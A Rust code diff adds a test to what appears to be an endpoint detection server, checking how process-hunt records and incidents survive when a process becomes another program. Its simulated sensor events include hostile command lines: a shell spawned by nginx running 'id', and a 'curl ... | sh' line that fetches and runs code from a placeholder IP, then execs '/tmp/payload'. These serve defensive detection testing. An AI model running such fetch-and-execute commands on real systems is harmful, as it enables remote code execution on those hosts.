@@ -2535,6 +2535,11 @@ fn quiet(pid: u32) -> SensorEvent {
     started(u64::from(pid), pid, 1, "/usr/bin/sleep", &["60"])
 }
 
+fn became(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
+    let SensorEvent::Process(process) = started(timestamp, pid, ppid, path, args) else { unreachable!() };
+    SensorEvent::Process(ProcessEvent { action: ProcessAction::Modify, ..process })
+}
+
 fn ended(timestamp: u64, pid: u32) -> SensorEvent {
     SensorEvent::Process(ProcessEvent { timestamp, pid, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None })
 }
@@ -3112,6 +3117,35 @@ async fn test_the_end_of_a_process_with_a_finding_is_opened_and_ends_its_hunt_ro
     let row: (String, Option<String>, i64, i64) = sqlx::query_as("SELECT name, parent_name, started_at, ended_at FROM hunt_processes WHERE agent_id = 'ending-late-host'").fetch_one(&pool).await.unwrap();
     assert_eq!(row, ("sh".to_string(), None, 2, 41), "an end that opens the process itself tells the process first and then its end");
     assert!(findings(&pool, "ending-late-host").await.is_empty() && open_incidents(&pool, "ending-late-host").await.is_empty());
+}
+
+#[tokio::test]
+async fn test_a_process_with_a_finding_keeps_the_hunt_row_of_that_finding_when_it_runs_another_program() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "exec-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    host.deliver(&app, &[nginx, shell]).await;
+
+    host.deliver(&app, &[became(30, 21, 20, "/usr/bin/sleep", &["25"]), ended(41, 21)]).await;
+
+    let rows: Vec<(String, String, Option<String>, i64, Option<i64>)> =
+        sqlx::query_as("SELECT name, command, parent_name, started_at, ended_at FROM hunt_processes WHERE agent_id = 'exec-host' AND pid = 21").fetch_all(&pool).await.unwrap();
+    assert_eq!(
+        rows,
+        [("sh".to_string(), "/bin/sh -c id".to_string(), Some("nginx".to_string()), 2, Some(41))],
+        "the end opens the program the shell had become, and the row a hunt searches still tells what the finding was about"
+    );
+    assert_eq!(hunt_total(&app, r#"process where command ~ "sh -c id" and running = false"#).await, 1);
+    let stored: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE agent_id = 'exec-host' AND event_type = 'process' ORDER BY rowid").fetch_all(&pool).await.unwrap();
+    assert_eq!(stored.len(), 4, "the program it became is told as an event of its own");
+    assert_eq!(serde_json::from_str::<serde_json::Value>(&stored[2]).unwrap(), stored_form(&became(30, 21, 20, "/usr/bin/sleep", &["25"])));
+    assert_eq!(open_incidents(&pool, "exec-host").await, vec!["detection.server-child"]);
+
+    let mut later = enroll_endpoint(&app, &pool, "exec-into-finding-host").await;
+    later.deliver(&app, &[started(1, 20, 0, "/usr/sbin/nginx", &[]), started(2, 21, 20, "/usr/bin/env", &["true"]), started(3, 22, 21, "/bin/sh", &["-c", "curl -s http://203.0.113.9/a | sh"])]).await;
+    later.deliver(&app, &[became(30, 21, 20, "/tmp/payload", &[])]).await;
+    let row: (String, String, Option<String>, i64) = sqlx::query_as("SELECT name, path, parent_name, started_at FROM hunt_processes WHERE agent_id = 'exec-into-finding-host' AND pid = 21").fetch_one(&pool).await.unwrap();
+    assert_eq!(row, ("payload".to_string(), "/tmp/payload".to_string(), Some("nginx".to_string()), 2), "a process first shown as a parent is rewritten by a finding of its own");
 }
 
 #[tokio::test]
